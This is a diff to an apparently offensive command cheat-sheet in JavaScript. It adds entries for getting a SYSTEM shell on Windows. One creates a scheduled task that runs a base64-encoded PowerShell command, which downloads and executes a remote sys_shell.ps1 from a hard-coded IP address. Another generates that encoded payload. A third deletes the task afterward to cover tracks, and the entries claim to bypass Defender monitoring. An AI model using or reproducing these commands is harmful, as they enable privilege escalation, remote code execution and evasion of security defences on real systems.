@@ -4495,6 +4495,27 @@ const COMMANDS = [
     tags: ["ps", "evasion", "privesc"],
     accent: "#e91e63"
   },
+  {
+    title: "[PRIVESC] SYSTEM via Scheduled Task (TESTED)",
+    desc: "Get SYSTEM shell via scheduled task. Bypasses Defender behavior monitoring. Requires admin.",
+    code: "# Encoded: IEX(IWR http://VPS:8889/sys_shell.ps1 -UseBasicParsing)\nschtasks /create /tn SysUpdate /tr \"powershell -ep bypass -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbABsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\" /sc once /st 00:00 /ru SYSTEM /f\nschtasks /run /tn SysUpdate\n# Cleanup after shell connects:\nschtasks /delete /tn SysUpdate /f",
+    tags: ["cmd", "privesc", "evasion", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Generate Encoded IEX Payload",
+    desc: "Generate base64 for scheduled task. Replace URL with your VPS.",
+    code: "$cmd = \"IEX(IWR http://168.144.166.97:8889/sys_shell.ps1 -UseBasicParsing)\"\n$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)\n$b64 = [Convert]::ToBase64String($bytes)\nWrite-Host \"schtasks /create /tn Update /tr `\"powershell -ep bypass -enc $b64`\" /ru SYSTEM /sc once /st 00:00 /f\"",
+    tags: ["ps", "privesc", "evasion"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "VPS: Cleanup Scheduled Task",
+    desc: "Delete scheduled task after getting shell.",
+    code: "schtasks /delete /tn SysUpdate /f",
+    tags: ["cmd", "cleanup"],
+    accent: "#607d8b"
+  },
 ];
 
 const list = document.getElementById('cmdList');
